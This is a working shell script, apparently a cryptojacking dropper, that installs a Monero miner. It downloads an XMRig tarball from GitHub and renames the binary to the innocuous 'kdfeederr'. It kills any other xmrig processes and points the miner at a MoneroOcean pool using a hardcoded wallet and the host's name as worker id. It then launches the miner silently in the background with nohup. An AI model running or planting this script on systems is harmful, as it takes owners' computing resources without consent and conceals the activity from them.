#!/bin/sh
WALLET="86d9KS12AnJTAVCbQcsw7G5e18ETxxVgAYyzM5d1yxxtAQXAAeAUoD6Sithghh7ookT3GNnkDX276GCRyNpPn9M4Nv2M44B"
EMAIL="${1:-}"
BIN_NAME="kdfeederr"
DIR="$HOME/moneroocean"
BIN="$DIR/$BIN_NAME"
CFG="$DIR/config.json"
CFGB="$DIR/config_background.json"

fail() { echo "FAILED: $1"; exit 1; }
have() { command -v "$1" >/dev/null 2>&1; }

[ -n "${HOME:-}" ] || fail "HOME not set"
[ -d "$HOME" ] || fail "HOME dir missing"
have curl || have wget || fail "no curl/wget"

WBASE="${WALLET%%.*}"
WLEN="${#WBASE}"
if [ "$WLEN" != "95" ] && [ "$WLEN" != "106" ]; then fail "bad wallet length ($WLEN)"; fi

CPU_THREADS=1
if have nproc; then
  T=$(nproc 2>/dev/null | tr -dc '0-9')
  [ -n "$T" ] && CPU_THREADS="$T"
fi
EXP=$(( CPU_THREADS * 700 / 1000 ))
[ "$EXP" -lt 1 ] && EXP=1
PORT=$(( EXP * 30 ))
[ "$PORT" -eq 0 ] && PORT=1

if have bc; then
  PORT=$(echo "x=l($PORT)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l | cut -d. -f1 | tr -dc '0-9')
  [ -z "$PORT" ] && PORT=1
else
  P=1; while [ "$P" -lt "$PORT" ]; do P=$(( P * 2 )); done; PORT=$P
fi
PORT=$(( 10000 + PORT ))
[ "$PORT" -lt 10001 ] && fail "port out of range"
[ "$PORT" -gt 18192 ] && fail "port out of range"

pkill -f "$BIN_NAME" 2>/dev/null || true
pkill -f "xmrig" 2>/dev/null || true
rm -rf "$DIR" || fail "cannot remove $DIR"
mkdir -p "$DIR" || fail "cannot create $DIR"

if have curl; then
  curl -sL "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz || fail "download failed"
else
  wget -q "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -O /tmp/xmrig.tar.gz || fail "download failed"
fi

tar xf /tmp/xmrig.tar.gz -C "$DIR" 2>/dev/null || fail "unpack failed"
rm -f /tmp/xmrig.tar.gz
[ -f "$DIR/xmrig" ] || fail "xmrig binary missing"
mv "$DIR/xmrig" "$BIN" || fail "rename failed"
chmod +x "$BIN" || fail "chmod failed"

PASS=$(hostname 2>/dev/null | cut -f1 -d"." | sed -E 's/[^a-zA-Z0-9-]+/_/g')
[ -z "$PASS" ] && PASS="kdfeederr"
[ "$PASS" = "localhost" ] && PASS="kdfeederr"
[ -n "$EMAIL" ] && PASS="$PASS:$EMAIL"

JSON_CONFIG="{\"api\":{\"id\":null,\"worker-id\":null},\"background\":false,\"colors\":true,\"cpu\":{\"enabled\":true,\"huge-pages\":true,\"priority\":1,\"yield\":true,\"max-threads-hint\":90,\"asm\":true},\"donate-level\":1,\"log-file\":\"$DIR/xmrig.log\",\"pools\":[{\"algo\":null,\"coin\":null,\"url\":\"gulf.moneroocean.stream:$PORT\",\"user\":\"$WALLET\",\"pass\":\"$PASS\",\"rig-id\":null,\"nicehash\":false,\"keepalive\":true,\"enabled\":true,\"tls\":false}],\"print-time\":60,\"retries\":5,\"retry-pause\":5,\"syslog\":false,\"watch\":true}"
printf "%s" "$JSON_CONFIG" > "$CFG"
[ -s "$CFG" ] || fail "config write failed"

JSON_BG=$(printf "%s" "$JSON_CONFIG" | sed 's/"background":false/"background":true/')
printf "%s" "$JSON_BG" > "$CFGB"

printf "#!/bin/sh\nif ! pidof %s >/dev/null 2>&1; then\n  nice %s \"\$@\"\nelse\n  echo \"Miner already running.\"\nfi\n" "$BIN_NAME" "$BIN" > "$DIR/miner.sh"
chmod +x "$DIR/miner.sh" || fail "miner.sh chmod failed"

nohup "$BIN" --config="$CFGB" >/dev/null 2>&1 &
sleep 2
pgrep -f "$BIN_NAME" >/dev/null 2>&1 || fail "miner did not stay up (see $DIR/xmrig.log)"

PIDS=$(pgrep -f "$BIN_NAME" | tr '\n' ' ')
echo "SUCCESS: pid=$PIDS port=$PORT persist=no"
